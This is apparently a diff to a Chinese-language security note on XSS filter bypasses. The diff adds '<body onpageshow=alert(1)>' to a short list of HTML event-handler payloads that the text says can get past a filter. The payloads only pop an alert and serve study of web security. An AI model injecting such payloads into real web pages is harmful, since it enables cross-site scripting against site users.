@@ -30,6 +30,7 @@
   除此之外以下几个`payload`都可以绕过。
   ```javascript
   <body/onfocus=alert(/xss/)>
+  <body onpageshow=alert(1)>
   <details open ontoggle=alert(/xss/)>
   <button onfocus=alert(/xss/) autofocus>
   
